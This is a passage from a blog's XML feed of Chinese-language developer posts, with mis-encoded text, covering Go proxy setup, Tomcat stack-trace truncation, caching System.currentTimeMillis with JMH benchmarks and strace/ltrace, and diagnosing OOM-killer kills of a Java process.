<li><a href="http://www.fanyilun.me/2017/07/18/%E8%B0%88%E8%B0%88Java%20Intrumentation%E5%92%8C%E7%9B%B8%E5%85%B3%E5%BA%94%E7%94%A8/" rel="external nofollow noopener noreferrer" target="_blank">è°ˆè°ˆJava Intrumentationå’Œç›¸å…³åº”ç”¨ | Yilun Fanâ€™s Blog</a></li>
<li><a href="http://www.bijishequ.com/detail/435931?p=29-55" rel="external nofollow noopener noreferrer" target="_blank">Grays Anatomyæºç æµ…æâ€“ClassLoader,Java,Method,DES,null,æ–¹æ³•,INVOKING</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html" rel="external nofollow noopener noreferrer" target="_blank">java.lang.instrument (Java Platform SE 8 )</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse61/index.html" rel="external nofollow noopener noreferrer" target="_blank">Java SE 6 æ–°ç‰¹æ€§: Instrumentation æ–°åŠŸèƒ½</a></li>
<li><a href="https://docs.oracle.com/javase/7/docs/platform/jvmti/jvmti.html#writingAgents" rel="external nofollow noopener noreferrer" target="_blank">JVM(TM) Tool Interface 1.2.1</a></li>
<li><a href="https://www.gitbook.com/book/sachin-handiekar/learning-jvmti/details" rel="external nofollow noopener noreferrer" target="_blank">Learning JVMTI Â· GitBook</a></li>
<li><a href="http://lovestblog.cn/blog/2014/06/18/jvm-attach/" rel="external nofollow noopener noreferrer" target="_blank">JVM Attachæœºåˆ¶å®ç° - ä½ å‡ç¬¨</a></li>
<li><a href="https://www.slideshare.net/hongjiang/shelljava" rel="external nofollow noopener noreferrer" target="_blank">Shell,ä¿¡å·é‡ä»¥åŠjavaè¿›ç¨‹çš„é€€å‡º</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse63/" rel="external nofollow noopener noreferrer" target="_blank">Java SE 6 æ–°ç‰¹æ€§: JMX ä¸ç³»ç»Ÿç®¡ç†</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> perf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> greys </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Let's go!(Goè¯­è¨€å­¦ä¹ )]]></title>
      <url>http://qsli.github.io/2018/01/20/go-figure/</url>
      <content type="html"><![CDATA[<h2 id="goå­¦ä¹ èµ„æ–™"><a href="#goå­¦ä¹ èµ„æ–™" class="headerlink" title="goå­¦ä¹ èµ„æ–™"></a>goå­¦ä¹ èµ„æ–™</h2><h3 id="go-tutorial"><a href="#go-tutorial" class="headerlink" title="go tutorial"></a>go tutorial</h3><p><a href="https://tour.golang.org/list" rel="external nofollow noopener noreferrer" target="_blank">A Tour of Go</a></p>
<p>ç®€å•çš„è¯­æ³•ä»‹ç», å¯ä»¥åœ¨çº¿ç¼–è¯‘/è¿è¡Œ</p>
<img src="/2018/01/20/go-figure/go-tour.png">
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><h4 id="go-getè®¿é—®è¢«å¢™ç½‘ç«™"><a href="#go-getè®¿é—®è¢«å¢™ç½‘ç«™" class="headerlink" title="go getè®¿é—®è¢«å¢™ç½‘ç«™"></a>go getè®¿é—®è¢«å¢™ç½‘ç«™</h4><p>æœ‰äº›åŒ…åªæœ‰å¢™å¤–æ‰èƒ½è®¿é—®åˆ°, å› æ­¤ç¬¬ä¸€æ­¥å¿…é¡»ç¿»å¢™.</p>
<blockquote>
<p>å¦ä¸€ä¸ªæ–¹æ³•æ˜¯å®ç”¨ cow, è¿™æ˜¯shadowsocks-goä½œè€…çš„å¦ä¸€ä¸ªå¼€å‘é¡¹ç›®ï¼Œæ ¹æ®é¡¹ç›®ä»‹ç»å¾ˆå®¹æ˜“çš„é…ç½®,å¯ä»¥åœ¨æœ¬æœºå¯åŠ¨ä¸€ä¸ªhttpä»£ç†ï¼Œä»¥shadowsocksä¸ºäºŒçº§ä»£ç†ã€‚</p>
</blockquote>
<p>è¡¥å……ä¸€ç‚¹, ç”¨aliasçš„æ–¹å¼, å¯ä»¥åªæŒ‡å®šgoä½¿ç”¨ä»£ç†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">alias</span> go=<span class="string">'http_proxy=127.0.0.1:8080  https_proxy=127.0.0.1:8080 go'</span></span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://colobu.com/2017/01/26/how-to-go-get-behind-GFW/" rel="external nofollow noopener noreferrer" target="_blank">å¦‚ä½•åœ¨é•¿åŸåé¢go getä¸€äº›åº“ | é¸Ÿçª</a></p>
</li>
<li><p><a href="https://tour.golang.org/list" rel="external nofollow noopener noreferrer" target="_blank">A Tour of Go</a></p>
</li>
<li><p><a href="https://stackoverflow.com/questions/10383299/how-do-i-configure-go-to-use-a-proxy" rel="external nofollow noopener noreferrer" target="_blank">How do I configure Go to use a proxy? - Stack Overflow</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> go </category>
            
        </categories>
        
        
        <tags>
            
            <tag> goå­¦ä¹ èµ„æ–™ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Tomcatæ—¥å¿—ä¸­å¼‚å¸¸å †æ ˆä¸å®Œæ•´]]></title>
      <url>http://qsli.github.io/2017/12/03/jvm-omit-fast-throw/</url>
      <content type="html"><![CDATA[<h2 id="ç°è±¡"><a href="#ç°è±¡" class="headerlink" title="ç°è±¡"></a>ç°è±¡</h2><p>tomcatçš„å¼‚å¸¸æ—¥å¿—ä¼šæ‰“å°åˆ°<code>catalina.out</code>ä¸­ï¼Œæœ‰çš„æ—¶å€™å‘ç°æ—¥å¿—çš„å †æ ˆå¹¶ä¸å®Œæ•´ï¼Œ åªèƒ½çœ‹åˆ°éƒ¨åˆ†çš„å †æ ˆä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Exception: NullPointerException | 2390852_pd2390852_prc2390852_sr2390852_ncb2390852_pm45090051_pd45090051_prc45090051_sr45090051_ncb45090051_pm36619638_pd36619638_prc36619638_sr36619638_ncb36619638_pm1122394_pd1122394_prc1122394_sr1122394_ncb1122394_pm</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        at sun.reflect.GeneratedMethodAccessor481.invoke(Unknown Source) ~[na:na]</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_60]</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:497) ~[na:1.8.0_60]</span><br><span class="line">        at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:221) ~[spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) ~[spring-web-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:110) ~[spring-webmvc-4.2.5.RELEASE.jar:4.2.5.RELEASE]</span><br><span class="line">        at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invoke</span><br><span class="line">java.lang.NullPointerException: null</span><br><span class="line">[2016-12-05 11:29:27][h_hprice_breeze_p_161205.112927.10.90.5.48.6486.595359_1][ESC[31mWARN ESC[0;39m]logX -&gt; desc = SHotel çŠ¶æ€æ— æ•ˆ, data = hotelId[</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ª<code>NPE</code>åªæ‰“å°äº†ï¼Œä¸€ä¸ªmessageï¼Œ å†…éƒ¨çš„å †æ ˆéƒ½æ²¡æœ‰äº†ï¼Œè¿™æ ·å°±æ— æ³•æ ¹æ®å †æ ˆä¿¡æ¯æ‰¾åˆ°å¯¹åº”çš„ä»£ç çš„ä½ç½®ã€‚</p>
<h2 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h2><h3 id="jvmçš„ä¼˜åŒ–"><a href="#jvmçš„ä¼˜åŒ–" class="headerlink" title="jvmçš„ä¼˜åŒ–"></a>jvmçš„ä¼˜åŒ–</h3><blockquote>
<p>HotSpotè™šæ‹Ÿæœºçš„JITä¼˜åŒ–ï¼ŒæŠŠå¤šæ¬¡æ‰“çš„å †æ ˆç»™ä¼˜åŒ–æ‰äº†ï¼Œå¾€ä¸ŠGrepåº”è¯¥èƒ½Grepåˆ°å®Œæ•´çš„å †æ ˆã€‚</p>
</blockquote>
<h4 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h4><p>è¿™ç§è¢«ä¼˜åŒ–è°ƒçš„å †æ ˆï¼Œç¬¬ä¸€æ¬¡éƒ½æ˜¯æ‰“å‡ºæ¥å®Œæ•´çš„ï¼Œå› æ­¤å¯ä»¥å‘ä¸Šç¿»ç¿»ï¼Œåº”è¯¥æ˜¯èƒ½æ‰¾åˆ°å®Œæ•´çš„ç°åœºçš„ã€‚</p>
<p>é¢‘ç¹çš„æ‰“å°å¼‚å¸¸çš„å †æ ˆï¼Œå¯¹ç³»ç»Ÿæ€§èƒ½ä¹Ÿæœ‰è¾ƒå¤§çš„å½±å“ï¼Œä¸è¿‡å¦‚æœä¸æ˜¯ç”Ÿäº§ç¯å¢ƒï¼Œå¯ä»¥åœ¨jvmçš„å¯åŠ¨å‚æ•°åé¢åŠ ä¸Š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:-OmitStackTraceInFastThrow</span><br></pre></td></tr></table></figure>
<p>å°†è¿™ç§ä¼˜åŒ–ä¸»åŠ¨å…³é—­</p>
<h3 id="æ—¥å¿—æ‰“çš„å¤ªå¿«"><a href="#æ—¥å¿—æ‰“çš„å¤ªå¿«" class="headerlink" title="æ—¥å¿—æ‰“çš„å¤ªå¿«"></a>æ—¥å¿—æ‰“çš„å¤ªå¿«</h3><p>å…¶å®æ‰“åˆ°tomcatçš„<code>catalina.out</code>çš„åº”è¯¥æ˜¯æœ‰ä¸¤ä¸ªæ—¥å¿—æ¡†æ¶ï¼Œä¸€ä¸ªæ˜¯tomcatè‡ªå·±å¸¦çš„ï¼Œä¸€ä¸ªæ˜¯åº”ç”¨çš„ã€‚</p>
<p>tomcatè‡ªå·±å¸¦äº†ä¸€ä¸ªæ—¥å¿—çš„æ¡†æ¶ â€”â€” <code>juli</code></p>
<p>è‡ªå·±çš„åº”ç”¨ä¸­ä¸€èˆ¬ä¹Ÿä¼šç”¨ä¸€ä¸ªæ—¥å¿—çš„æ¡†æ¶ï¼Œæ¯”å¦‚ â€”â€” <code>logback</code></p>
<p>è¿™æ ·å°±å­˜åœ¨åŒæ—¶å†™å…¥<code>catalina.out</code>æ–‡ä»¶çš„å¯èƒ½ï¼Œ<code>juli</code>æ—¥å¿—åˆšæ‰“äº†ä¸€åŠï¼Œ å°±è¢«<code>logback</code>æ‰“çš„æ—¥å¿—ç©¿æ’äº†ã€‚<br>è¿™æ ·æœ¬æ¥ä¸¤è¡Œç›¸é‚»çš„æ—¥å¿—ï¼Œå°±ä¼šå·®çš„åä¸‡å…«åƒé‡Œã€‚</p>
<blockquote>
<p>Tomcat çš„å†…éƒ¨æ—¥å¿—ä½¿ç”¨ JULI ç»„ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ª Apache Commons æ—¥å¿—çš„é‡å‘½åçš„æ‰“åŒ…åˆ†æ”¯ï¼Œé»˜è®¤è¢«ç¡¬ç¼–ç ï¼Œä½¿ç”¨ java.util.logging æ¶æ„ã€‚<br>è¿™èƒ½ä¿è¯ Tomcat å†…éƒ¨æ—¥å¿—ä¸ Web åº”ç”¨çš„æ—¥å¿—ä¿æŒç‹¬ç«‹ï¼Œå³ä½¿ Web åº”ç”¨ä½¿ç”¨çš„æ˜¯ Apache Commons Loggingã€‚</p>
</blockquote>
<p>æ­£æ˜¯è¿™ä¸ªç‹¬ç«‹æ€§ï¼Œå¯¼è‡´äº†æ—¥å¿—æœ‰å¯èƒ½æ˜¯ä¹±çš„ã€‚<br>tomcatåŠ è½½å†…éƒ¨çš„æ—¥å¿—ç»„ä»¶çš„åŠ è½½å™¨æ˜¯<code>System class loader</code>ï¼Œ<br>åº”ç”¨çš„æ—¥å¿—ç»„ä»¶çš„ç±»åŠ è½½å™¨æ˜¯<code>webapp class loader</code>ï¼Œå› æ­¤å³ä½¿ç”¨çš„æ˜¯åŒä¸€å¥—æ—¥å¿—ä½“ç³»ï¼Œç›¸äº’ä¹‹é—´åº”è¯¥è¿˜æ˜¯éš”ç¦»çš„ã€‚</p>
<p>logbackçš„å®˜æ–¹æ–‡æ¡£ä¹Ÿè¯´æ˜äº†ï¼š</p>
<blockquote>
<p>By virtue of class loader separation provided by the container,<br>each web-application will load its own copy of LoggerContext which will pickup its own copy of logback.xml.</p>
</blockquote>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://jawspeak.com/2010/05/26/hotspot-caused-exceptions-to-lose-their-stack-traces-in-production-and-the-fix/" rel="external nofollow noopener noreferrer" target="_blank">Hotspot caused exceptions to lose their stack traces in production â€“ and the fix at JAW Speak</a></p>
</li>
<li><p><a href="http://rongmayisheng.com/post/%E8%AF%91%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%B8%AD%E5%BC%82%E5%B8%B8%E5%A0%86%E6%A0%88%E4%B8%A2%E5%A4%B1%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88" rel="external nofollow noopener noreferrer" target="_blank">[è¯‘]ç”Ÿäº§ç¯å¢ƒä¸­å¼‚å¸¸å †æ ˆä¸¢å¤±çš„è§£å†³æ–¹æ¡ˆ | æˆç ä¸€ç”Ÿ</a></p>
</li>
<li><p><a href="http://wiki.jikexueyuan.com/project/tomcat/logging.html" rel="external nofollow noopener noreferrer" target="_blank">æ—¥å¿—æœºåˆ¶ - Tomcat 8 æƒå¨æŒ‡å— - æå®¢å­¦é™¢Wiki</a></p>
</li>
<li><p><a href="https://logback.qos.ch/manual/loggingSeparation.html" rel="external nofollow noopener noreferrer" target="_blank">Chapter 9: Logging separation</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tomcat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ç¼“å­˜System.currentTimeMillisçš„è°ƒç”¨]]></title>
      <url>http://qsli.github.io/2017/12/02/cache-system-time/</url>
      <content type="html"><![CDATA[<h2 id="ç³»ç»Ÿæ—¶é—´ç¼“å­˜çš„å¿…è¦"><a href="#ç³»ç»Ÿæ—¶é—´ç¼“å­˜çš„å¿…è¦" class="headerlink" title="ç³»ç»Ÿæ—¶é—´ç¼“å­˜çš„å¿…è¦"></a>ç³»ç»Ÿæ—¶é—´ç¼“å­˜çš„å¿…è¦</h2><img src="/2017/12/02/cache-system-time/time-cache.jpg">
<p>é™¤äº†ç½‘ç»œæœåŠ¡å™¨ï¼Œç›‘æ§ç³»ç»Ÿå’Œæ—¥å¿—ç³»ç»Ÿä¹Ÿä¼šé¢‘ç¹çš„è°ƒç”¨<code>System.currentTimeMillis</code>ã€‚çœ‹å…¬<br>å¸å†…éƒ¨å®ç°çš„å¼‚æ­¥æ—¥å¿—ä¸­å°±å¯¹ç³»ç»Ÿæ—¶é—´è¿›è¡Œäº†ç¼“å­˜ã€‚</p>
<h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><script src="//gist.github.com/a42cea0411b2cff131f34d82d030115b.js"></script>
<h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>ä½¿ç”¨<code>JMH</code>åšä¸€ä¸ª<code>benchmark</code>å‹åŠ›æµ‹è¯•ï¼Œ <code>JMH</code>åœ¨åšæµ‹è¯•ä¹‹å‰ä¼šæœ‰é¢„çƒ­çš„è¿‡ç¨‹ï¼Œä»¥æ’<br>é™¤<code>jit</code>ç­‰å› ç´ çš„å½±å“ï¼Œåœ¨ç³»ç»Ÿè¾¾åˆ°ç¨³å®šè¿è¡Œçš„æ—¶å€™å†å»å¯¹æ¯”ä¸¤ä¸ªæ–¹æ³•çš„è°ƒç”¨ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RunnerException </span>&#123;</span><br><span class="line">Options opt = <span class="keyword">new</span> OptionsBuilder()</span><br><span class="line">               .include(CurrentTimeMillions<span class="class">.<span class="keyword">class</span>.<span class="title">getSimpleName</span>())</span></span><br><span class="line"><span class="class">               .<span class="title">mode</span>(<span class="title">Mode</span>.<span class="title">AverageTime</span>)</span></span><br><span class="line"><span class="class">               .<span class="title">measurementIterations</span>(2000)</span></span><br><span class="line"><span class="class">               .<span class="title">forks</span>(1)</span></span><br><span class="line"><span class="class">               .<span class="title">build</span>()</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">new</span> Runner(opt).run();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Run complete. Total time: 01:07:53</span><br><span class="line"></span><br><span class="line">Benchmark                            Mode   Cnt   Score     Error  Units</span><br><span class="line">CurrentTimeMillions.test             avgt  2000  â‰ˆ 10â»â¸             s/op</span><br><span class="line">CurrentTimeMillions.testSystemTimer  avgt  2000  â‰ˆ 10â»â¹             s/op</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿˜æ˜¯å·®äº†ä¸€ä¸ªæ•°é‡çº§ï¼Œå¦‚æœå¯¹æ—¶é—´çš„ç²¾åº¦è¦æ±‚æ²¡æœ‰é‚£ä¹ˆé«˜ï¼Œè¿˜æ˜¯å¯ä»¥ç¼“å­˜ä¸‹çš„ã€‚</p>
<h2 id="æŸ¥çœ‹è°ƒç”¨çš„ç³»ç»Ÿæ–¹æ³•"><a href="#æŸ¥çœ‹è°ƒç”¨çš„ç³»ç»Ÿæ–¹æ³•" class="headerlink" title="æŸ¥çœ‹è°ƒç”¨çš„ç³»ç»Ÿæ–¹æ³•"></a>æŸ¥çœ‹è°ƒç”¨çš„ç³»ç»Ÿæ–¹æ³•</h2><p>ä½¿ç”¨<code>strace</code>attach åˆ°å½“å‰çš„è¿›ç¨‹ï¼ŒæŸ¥çœ‹è¿›ç¨‹ç›¸åº”çš„è°ƒç”¨</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -p  [pid]</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">âœ sudo strace -p 15588</span><br><span class="line">strace: Process 15588 attached</span><br><span class="line">futex(0x7f8c175f99d0, FUTEX_WAIT, 15589, NULL</span><br></pre></td></tr></table></figure>
<p>å¹¶æ²¡æœ‰çœ‹åˆ°å…·ä½“çš„ç³»ç»Ÿè°ƒç”¨ï¼ŒæŸ¥æ‰¾åŸå› å‘ç°ï¼š</p>
<blockquote>
<p>è¿™é‡Œä½¿ç”¨ ltrace æ˜¯å› ä¸º linux æ”¯æŒ VDSO ä¹‹åï¼Œgettimeofday å±äºå¿«é€Ÿç³»ç»Ÿè°ƒç”¨ï¼Œä½¿<br>ç”¨ strace æ˜¯çœ‹ä¸åˆ°æ‰§è¡Œç»“æœçš„ã€‚</p>
</blockquote>
<blockquote>
<p>What is actually happening here is that we are linking to the vDSO (virtual<br>dynamic shared object), which is a small fully relocatable shared library<br>pre-mapped into the user address space. The linking happens during the first<br>call of gettimeofday, after which the call is resolved, and the first indirect<br>jump goes straight into the function.</p>
</blockquote>
<p>é‡æ–°ä½¿ç”¨<code>ltrace</code>æŸ¥çœ‹ï¼š</p>
<p>å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~  sudo ltrace  -c -S  -p 16365</span><br><span class="line">^C% time     seconds  usecs/call     calls      <span class="keyword">function</span></span><br><span class="line">------ ----------- ----------- --------- --------------------</span><br><span class="line"> 76.73   14.190163        1880      7544 SYS_getegid32</span><br><span class="line"> 23.27    4.303741      614820         7 SYS_madvise1</span><br><span class="line">  0.00    0.000197          24         8 SYS_exit</span><br><span class="line">------ ----------- ----------- --------- --------------------</span><br><span class="line">100.00   18.494101                  7559 total</span><br></pre></td></tr></table></figure>
<p>ç„¶è€Œè¿˜æ˜¯æ²¡æœ‰çœ‹åˆ°<code>gettimeofday</code>çš„è°ƒç”¨ï¼Œå…·ä½“åŸå› ä¸å¾—è€ŒçŸ¥ã€‚</p>
<h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><blockquote>
<p>premature optimization is the root of all evil è¿‡æ—©ä¼˜åŒ–æ˜¯ä¸‡æ¶ä¹‹æº</p>
</blockquote>
<p>å¦‚æœç³»ç»Ÿçš„æ€§èƒ½èƒ½æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ï¼Œå°±ä¸è¦è¿‡æ—©çš„åšè¿™äº›ä¼˜åŒ– ; ç³»ç»Ÿä¼˜åŒ–ä¹‹å‰éœ€è¦å…ˆåš<br>profilingï¼Œæ‰¾åˆ°çœŸæ­£çš„ç“¶é¢ˆï¼Œåœ¨æ¬¡ä¹‹å‰éœ€è¦ä¿æŒç³»ç»Ÿçš„ç®€å•ï¼Œå¯é ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://blog.csdn.net/will_awoke/article/details/27084907" rel="external nofollow noopener noreferrer" target="_blank">SystemTimer CurrentTimeMillis æ—¶é—´ç¼“å­˜ - CSDN åšå®¢</a></p>
</li>
<li><p>ã€ŠNIO trick and trap ã€‹</p>
</li>
<li><p><a href="http://feiyang21687.github.io/SystemNano/" rel="external nofollow noopener noreferrer" target="_blank">System.nanoTime() çš„å®ç°åˆ†æ â€“ é™ˆé£ â€“ ç å†œ</a></p>
</li>
<li><p><a href="http://blog.caoxudong.info/blog/2017/09/08/currentTimeMillis_in_java" rel="external nofollow noopener noreferrer" target="_blank">jdk8 ä¸­çš„æ—¶é—´è·å–</a></p>
</li>
<li><p><a href="http://pzemtsov.github.io/2017/07/23/the-slow-currenttimemillis.html" rel="external nofollow noopener noreferrer" target="_blank">The slow currentTimeMillis()</a></p>
</li>
<li><p><a href="http://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8185891" rel="external nofollow noopener noreferrer" target="_blank">Bug ID: JDK-8185891 System.currentTimeMillis() is slow on Linux, especially with the HPET time source</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cache </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä½¿ç”¨google perfå·¥å…·æ¥æ’æŸ¥å †å¤–å†…å­˜å ç”¨]]></title>
      <url>http://qsli.github.io/2017/12/02/google-perf-tools/</url>
      <content type="html"><![CDATA[<h2 id="ç°è±¡"><a href="#ç°è±¡" class="headerlink" title="ç°è±¡"></a>ç°è±¡</h2><p>çº¿ä¸Šæœºå™¨å†…å­˜ä¸è¶³ï¼Œç»å¸¸è¢«ç³»ç»Ÿ<code>oom killer</code>å¹²æ‰ã€‚</p>
<p>å¦‚æœ<code>tomcat</code>è¿è¡Œçš„å¥½å¥½çš„ï¼Œçªç„¶è¢«å¹²æ‰äº†ï¼Œæ²¡æœ‰ä»»ä½•çº¿ç´¢ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤çœ‹çœ‹æ˜¯ä¸æ˜¯<code>oom killer</code>æçš„é¬¼</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dmesg | grep -i <span class="built_in">kill</span> | less</span><br><span class="line"></span><br><span class="line">Out of memory: Kill process 23195 (java) score 558 or sacrifice child</span><br><span class="line">Killed process 23195, UID 40001, (java) total-vm:81176732kB, anon-rss:64507900kB, file-rss:2604kB</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>anon-rss</code>æ˜¯ç¨‹åºå ç”¨çš„ç‰©ç†å†…å­˜ï¼Œ  64507900kB = 61.519527435302734 GB<br>ç³»ç»Ÿæ€»çš„å†…å­˜ä¹Ÿæ‰<code>62GB</code>ï¼Œlinuxå‘ç°æ²¡æœ‰å¯åˆ†é…çš„å†…å­˜ï¼Œå°±ä¼šå¯ç”¨<code>oom killer</code>çš„æœºåˆ¶ï¼Œæ ¹æ®<code>oom_score_adj</code>çš„å€¼å»å¹²æ‰ç›¸åº”çš„è¿›ç¨‹äº†ã€‚</p>
<p>ç³»ç»Ÿä¸Š<code>oom_score_adj</code>çš„å€¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">43722 total pagecache pages</span><br><span class="line">4335 pages in swap cache</span><br><span class="line">Swap cache stats: add 1009840, delete 1005505, find 76432470/76485037</span><br><span class="line">Free swap  = 49990420kB</span><br><span class="line">Total swap = 50331644kB</span><br><span class="line">16777215 pages RAM</span><br><span class="line">282254 pages reserved</span><br><span class="line">36481 pages shared</span><br><span class="line">16386140 pages non-shared</span><br><span class="line">[ pid ]   uid  tgid total_vm      rss cpu oom_adj oom_score_adj name</span><br><span class="line">[ 1419]     0  1419     2883       94  18     -17         -1000 udevd</span><br><span class="line">[ 2894]     0  2894     2660      105   6     -17         -1000 udevd</span><br><span class="line">[ 2895]     0  2895     2882       43   2     -17         -1000 udevd</span><br><span class="line">[  388]     0   388    16557       63  12     -17         -1000 sshd</span><br><span class="line">[ 1340]     0  1340   152806     9114   6       0             0 salt-minion</span><br><span class="line">[ 1341]     0  1341   110173     5224  22       0             0 salt-minion</span><br><span class="line">[14168]     0 14168     6899      149   6     -17         -1000 auditd</span><br></pre></td></tr></table></figure>
<p><code>tomcat</code>çš„è¿›ç¨‹å ç”¨å†…å­˜æœ€å¤šï¼Œå¾—åˆ†ä¹Ÿæœ€é«˜ â€”â€” 558</p>
<h3 id="tomcatçš„é…ç½®"><a href="#tomcatçš„é…ç½®" class="headerlink" title="tomcatçš„é…ç½®"></a>tomcatçš„é…ç½®</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> -Xms44g -Xmx44g -server \</span><br><span class="line">-XX:+UseG1GC -XX:MaxGCPauseMillis=200 \</span><br><span class="line">-XX:InitiatingHeapOccupancyPercent=65 -XX:SurvivorRatio=8 \</span><br><span class="line">-XX:MaxTenuringThreshold=15 \</span><br><span class="line">-verbosegc -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps \</span><br><span class="line">-XX:+PrintTenuringDistribution -XX:+PrintAdaptiveSizePolicy \</span><br><span class="line">-XX:-TraceClassUnloading \</span><br><span class="line">-XX:+DisableExplicitGC</span><br></pre></td></tr></table></figure>
